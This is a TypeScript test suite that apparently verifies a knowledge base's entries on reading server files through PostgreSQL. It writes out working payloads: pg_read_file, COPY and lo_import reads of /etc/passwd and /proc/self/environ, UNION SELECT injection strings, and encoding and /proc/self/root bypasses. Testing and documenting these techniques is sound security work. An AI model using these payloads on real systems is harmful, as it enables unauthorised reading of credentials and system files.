/**
 * PostgreSQL Reading Files Tests
 *
 * @kb-coverage postgresql/reading-files - Full coverage
 *
 * Note: Many of these tests require superuser privileges or specific
 * role membership (pg_read_server_files). Tests are designed to verify
 * the technique works when permitted, and handle permission errors gracefully.
 */

import { randomBytes } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, test, expect, beforeAll, afterAll } from "vitest";
import {
  initDirectRunner,
  cleanupDirectRunner,
  directSQL,
  directSQLExpectSuccess,
  directSQLParameterized,
} from "../../src/runner/direct.js";
import { logger } from "../../src/utils/logger.js";

/**
 * Helper to unlink a large object and verify cleanup succeeded.
 * Logs a warning if cleanup fails.
 */
async function cleanupLargeObject(oid: number): Promise<void> {
  const { success, error } = await directSQLParameterized("SELECT lo_unlink($1)", [oid]);
  if (!success) {
    logger.warn(`Failed to cleanup large object ${oid}: ${error?.message}`);
  }
}

describe("PostgreSQL Reading Files", () => {
  beforeAll(async () => {
    logger.setLevel("warn");
    await initDirectRunner();
  }, 30000);

  afterAll(async () => {
    await cleanupDirectRunner();
  }, 10000);

  /**
   * @kb-entry postgresql/reading-files
   * @kb-section pg_read_file() Function
   */
  describe("pg_read_file() function", () => {
    test("pg_read_file() reads file content (if permitted)", async () => {
      const { success, result, error } = await directSQL(
        "SELECT pg_read_file('/etc/passwd') as content"
      );
      // Either succeeds (superuser) or fails with permission error
      if (success && result) {
        const content = (result.rows[0] as { content: string }).content;
        expect(content).toContain("root");
      } else {
        // Permission denied is expected for non-superuser
        expect(error?.message).toMatch(/permission denied|must be superuser/i);
      }
    });

    test("pg_read_file() with offset and length", async () => {
      const { success, error } = await directSQL(
        "SELECT pg_read_file('/etc/passwd', 0, 100) as content"
      );
      if (!success) {
        expect(error?.message).toMatch(/permission denied|must be superuser/i);
      }
      // Both success and permission denied are acceptable outcomes
    });

    test("pg_read_file() with missing_ok parameter", async () => {
      const { success, error } = await directSQL(
        "SELECT pg_read_file('/nonexistent/file', missing_ok => true) as content"
      );
      // Should succeed (returning NULL), fail with permission, or function variant not exist
      if (!success && error) {
        expect(error.message).toMatch(/permission denied|must be superuser|does not exist/i);
      }
    });
  });

  /**
   * @kb-entry postgresql/reading-files
   * @kb-section pg_read_binary_file() Function
   */
  describe("pg_read_binary_file() function", () => {
    test("pg_read_binary_file() reads binary content", async () => {
      const { success, error } = await directSQL(
        "SELECT pg_read_binary_file('/etc/passwd') as content"
      );
      if (!success) {
        expect(error?.message).toMatch(/permission denied|must be superuser/i);
      }
      // Both success and permission denied are acceptable outcomes
    });

    test("Encode binary file as hex", async () => {
      const { success, error } = await directSQL(
        "SELECT encode(pg_read_binary_file('/etc/passwd'), 'hex') as hex_content"
      );
      // Will fail without permissions
      if (!success && error) {
        expect(error.message).toMatch(/permission denied|must be superuser/i);
      }
    });
  });

  /**
   * @kb-entry postgresql/reading-files
   * @kb-section Using COPY
   */
  describe("Using COPY for file reading", () => {
    test("COPY FROM file technique", async () => {
      // Create temp table, copy from file, select
      const { success: createSuccess } = await directSQL(
        "CREATE TEMP TABLE IF NOT EXISTS temp_file_contents (line TEXT)"
      );
      expect(createSuccess).toBe(true);

      const { success: copySuccess, error } = await directSQL(
        "COPY temp_file_contents FROM '/etc/passwd'"
      );

      if (copySuccess) {
        const { rows } = await directSQLExpectSuccess("SELECT * FROM temp_file_contents LIMIT 5");
        expect(rows.length).toBeGreaterThan(0);
      } else {
        // Permission denied expected
        expect(error?.message).toMatch(/permission denied|could not open/i);
      }

      await directSQL("DROP TABLE IF EXISTS temp_file_contents");
    });
  });

  /**
   * @kb-entry postgresql/reading-files
   * @kb-section Using Large Objects
   */
  describe("Using large objects", () => {
    test("lo_import() imports file as large object", async () => {
      const { success, error } = await directSQL("SELECT lo_import('/etc/passwd')");
      if (!success) {
        expect(error?.message).toMatch(/permission denied|could not open/i);
      }
      // Both success and permission denied are acceptable outcomes
    });
  });

  /**
   * @kb-entry postgresql/reading-files
   * @kb-section pg_ls_dir() Function
   */
  describe("pg_ls_dir() function", () => {
    test("pg_ls_dir() lists directory contents", async () => {
      const { success, result, error } = await directSQL(
        "SELECT pg_ls_dir('/etc') as filename LIMIT 10"
      );
      if (success && result) {
        expect(result.rows.length).toBeGreaterThan(0);
      } else {
        expect(error?.message).toMatch(/permission denied|must be superuser/i);
      }
    });

    test("pg_ls_dir() on data directory", async () => {
      const { success, error } = await directSQL(
        "SELECT pg_ls_dir(current_setting('data_directory')) as filename LIMIT 5"
      );
      // Should work or fail with clear error
      if (!success && error) {
        expect(error.message).toMatch(/permission denied|must be superuser/i);
      }
    });
  });

  /**
   * @kb-entry postgresql/reading-files
   * @kb-section Configuration File Locations
   */
  describe("Configuration file locations", () => {
    test("Query config_file location", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT current_setting('config_file') as path"
      );
      const path = (rows[0] as { path: string }).path;
      expect(path).toContain("postgresql.conf");
    });

    test("Query hba_file location", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT current_setting('hba_file') as path");
      const path = (rows[0] as { path: string }).path;
      expect(path).toContain("pg_hba.conf");
    });

    test("Query data_directory location", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT current_setting('data_directory') as path"
      );
      const path = (rows[0] as { path: string }).path;
      expect(path).toBeTruthy();
    });
  });

  /**
   * @kb-entry postgresql/reading-files
   * @kb-section Injection Examples
   */
  describe("Injection context examples", () => {
    test("UNION SELECT pg_read_file()", async () => {
      const { success, error } = await directSQL(`
        SELECT id, username FROM users WHERE id = 1
        UNION SELECT 999, pg_read_file('/etc/passwd')
      `);
      // Demonstrates injection syntax - success depends on permissions
      if (!success && error) {
        expect(error.message).toMatch(/permission denied|must be superuser/i);
      }
    });

    test("UNION SELECT pg_ls_dir() aggregated", async () => {
      const { success, error } = await directSQL(`
        SELECT id, username FROM users WHERE id = 1
        UNION SELECT 999, string_agg(pg_ls_dir('/etc'), E'\\n')
      `);
      // Demonstrates injection syntax - success depends on permissions
      if (!success && error) {
        expect(error.message).toMatch(
          /permission denied|must be superuser|cannot contain set-returning/i
        );
      }
    });

    test("UNION SELECT config file path", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT id, username FROM users WHERE id = 1
        UNION SELECT 999, current_setting('config_file')
      `);
      const values = rows.map((r) => (r as { username: string }).username);
      expect(values.some((v) => v.includes("postgresql.conf"))).toBe(true);
    });
  });

  /**
   * @kb-entry postgresql/reading-files
   * @kb-section Bypassing Restrictions
   */
  describe("Bypassing restrictions", () => {
    test("Encode file content as base64", async () => {
      const { success, error } = await directSQL(
        "SELECT encode(pg_read_file('/etc/passwd')::bytea, 'base64') as encoded"
      );
      // Demonstrates encoding bypass - success depends on permissions
      if (!success && error) {
        expect(error.message).toMatch(/permission denied|must be superuser/i);
      }
    });

    test("Encode file content as hex", async () => {
      const { success, error } = await directSQL(
        "SELECT encode(pg_read_file('/etc/passwd')::bytea, 'hex') as encoded"
      );
      // Demonstrates encoding bypass - success depends on permissions
      if (!success && error) {
        expect(error.message).toMatch(/permission denied|must be superuser/i);
      }
    });
  });

  /**
   * @kb-entry postgresql/reading-files
   * @kb-section PostgreSQL 11+ Role-Based Access
   */
  describe("PostgreSQL 11+ role-based access", () => {
    test("Check pg_read_server_files membership", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT pg_has_role(current_user, 'pg_read_server_files', 'member') as has_role"
      );
      const hasRole = (rows[0] as { has_role: boolean }).has_role;
      expect(typeof hasRole).toBe("boolean");
    });
  });

  /**
   * @kb-entry postgresql/reading-files
   * @kb-section Using Large Objects - Extended
   */
  describe("Large object reading - extended", () => {
    test("lo_get() for direct content retrieval (PG 9.4+)", async () => {
      // Create LO, get content directly, clean up
      const { rows: createRows } = await directSQLExpectSuccess(
        "SELECT lo_from_bytea(0, 'secret content'::bytea) as oid"
      );
      expect(createRows).toHaveLength(1);
      const oid = (createRows[0] as { oid: number }).oid;

      try {
        // lo_get() returns bytea directly
        const { rows: readRows } = await directSQLExpectSuccess(`SELECT lo_get(${oid}) as content`);
        expect((readRows[0] as { content: Buffer }).content).toBeTruthy();
      } finally {
        await cleanupLargeObject(oid);
      }
    });

    test("lo_import + lo_get combined pattern", async () => {
      // This pattern is preferred for SQL injection as it works in single query
      const { success, error } = await directSQL("SELECT lo_get(lo_import('/etc/passwd'))");
      // Valid outcomes: success (returns bytea), permission denied, or LO doesn't exist
      if (!success) {
        expect(error?.message).toMatch(/permission denied|could not open|does not exist/i);
      }
      // If success, the combined pattern worked - no additional assertion needed
    });

    test("convert_from(lo_get(oid), 'UTF8') for text content", async () => {
      // Create LO with text, retrieve as text
      const { rows: createRows } = await directSQLExpectSuccess(
        "SELECT lo_from_bytea(0, 'readable text'::bytea) as oid"
      );
      expect(createRows).toHaveLength(1);
      const oid = (createRows[0] as { oid: number }).oid;

      try {
        const { rows: readRows } = await directSQLExpectSuccess(
          `SELECT convert_from(lo_get(${oid}), 'UTF8') as content`
        );
        expect((readRows[0] as { content: string }).content).toBe("readable text");
      } finally {
        await cleanupLargeObject(oid);
      }
    });

    test("lo_export to retrieve via pg_read_file", async () => {
      // Generate unique temp filename with cryptographically-strong random suffix
      const randomSuffix = randomBytes(16).toString("hex");
      const tempFile = path.join(os.tmpdir(), `lo_export_test_${randomSuffix}.txt`);

      // Create LO
      const { rows: createRows } = await directSQLExpectSuccess(
        "SELECT lo_from_bytea(0, 'export test data'::bytea) as oid"
      );
      expect(createRows).toHaveLength(1);
      const oid = (createRows[0] as { oid: number }).oid;

      try {
        // Try to export (requires privileges)
        // Use parameterized query to safely handle paths with special characters
        const { success, error } = await directSQLParameterized("SELECT lo_export($1, $2)", [
          oid,
          tempFile,
        ]);

        if (!success) {
          expect(error?.message).toMatch(/permission denied|could not open/i);
        }
      } finally {
        // Clean up LO
        await cleanupLargeObject(oid);
        // Clean up exported file if it exists
        try {
          await fs.promises.unlink(tempFile);
        } catch (err) {
          // Only ignore ENOENT (file not found) - surface other errors
          if ((err as NodeJS.ErrnoException).code !== "ENOENT") {
            console.error(`Failed to cleanup temp file ${tempFile}:`, err);
          }
        }
      }
    });
  });

  /**
   * @kb-entry postgresql/reading-files
   * @kb-section Path Bypass Techniques
   */
  describe("Path bypass techniques", () => {
    test("/proc/self/root bypass on Linux", async () => {
      // /proc/self/root provides alternate path to filesystem root
      const { success, error } = await directSQL(
        "SELECT pg_read_file('/proc/self/root/etc/passwd')"
      );
      if (!success) {
        // Either permission denied or not a Linux system
        expect(error?.message).toMatch(/permission denied|must be superuser|No such file/i);
      }
      // Both success and permission denied are acceptable outcomes
    });

    test("/proc/self/environ for environment variables", async () => {
      // Environment variables can contain secrets
      // Note: /proc/self/environ contains null bytes, which may cause encoding errors
      const { success, error } = await directSQL("SELECT pg_read_file('/proc/self/environ')");
      // Valid outcomes: success, permission denied, encoding error (null bytes), or file not found
      // All are acceptable - we're testing the technique exists
      if (!success && error) {
        expect(error.message).toMatch(
          /permission denied|must be superuser|No such file|invalid byte sequence/i
        );
      }
    });

    test("/proc/version for kernel info", async () => {
      const { success, error } = await directSQL("SELECT pg_read_file('/proc/version')");
      if (!success) {
        expect(error?.message).toMatch(/permission denied|must be superuser|No such file/i);
      }
      // Both success and permission denied are acceptable outcomes
    });
  });

  /**
   * @kb-entry postgresql/reading-files
   * @kb-section File Discovery
   */
  describe("File discovery", () => {
    test("pg_ls_dir with string_agg for listing", async () => {
      const { success, result, error } = await directSQL(
        "SELECT string_agg(pg_ls_dir('/tmp'), E'\\n') as files"
      );
      if (success && result) {
        // May be null if /tmp is empty
        expect(result.rows.length).toBe(1);
      } else if (error) {
        // Accepts: permission denied, superuser required, or SQL error for aggregate + SRF
        expect(error.message).toMatch(
          /permission denied|must be superuser|cannot contain set-returning/i
        );
      }
      // Both success and permission denied are acceptable outcomes
    });

    test("pg_stat_file for file metadata", async () => {
      // pg_stat_file returns size, access, modification, change, creation times
      const { success, result, error } = await directSQL(
        "SELECT (pg_stat_file('/etc/passwd')).size as file_size"
      );
      if (success && result) {
        // Size is returned as string by driver, convert to check
        const size = Number((result.rows[0] as { file_size: string | number }).file_size);
        expect(size).toBeGreaterThan(0);
      } else if (error) {
        expect(error.message).toMatch(/permission denied|must be superuser/i);
      }
      // Both success and permission denied are acceptable outcomes
    });

    test("pg_stat_file for checking file existence", async () => {
      // Can be used to test if files exist
      const { success, error } = await directSQL("SELECT (pg_stat_file('/etc/passwd', true)).size");
      if (!success && error) {
        expect(error.message).toMatch(/permission denied|must be superuser/i);
      }
      // Both success and permission denied are acceptable outcomes
    });
  });

  /**
   * @kb-entry postgresql/reading-files
   * @kb-section Injection Examples - Extended
   */
  describe("Injection examples - extended", () => {
    test("UNION SELECT with lo_get pattern", async () => {
      // Create a test LO first
      const { rows: createRows } = await directSQLExpectSuccess(
        "SELECT lo_from_bytea(0, 'injected_content'::bytea) as oid"
      );
      expect(createRows).toHaveLength(1);
      const oid = (createRows[0] as { oid: number }).oid;

      try {
        // Use in UNION context
        const { rows } = await directSQLExpectSuccess(
          `SELECT id, username FROM users WHERE id = 1 UNION SELECT 999, convert_from(lo_get(${oid}), 'UTF8')`
        );
        const values = rows.map((r) => (r as { username: string }).username);
        expect(values).toContain("injected_content");
      } finally {
        await cleanupLargeObject(oid);
      }
    });

    test("Reading PostgreSQL data directory paths", async () => {
      // These settings don't require superuser
      const { rows } = await directSQLExpectSuccess(`
        SELECT
          current_setting('data_directory') as data_dir,
          current_setting('config_file') as config,
          current_setting('hba_file') as hba
      `);
      const result = rows[0] as { data_dir: string; config: string; hba: string };
      expect(result.data_dir).toBeTruthy();
      expect(result.config).toContain("postgresql.conf");
      expect(result.hba).toContain("pg_hba.conf");
    });
  });
});
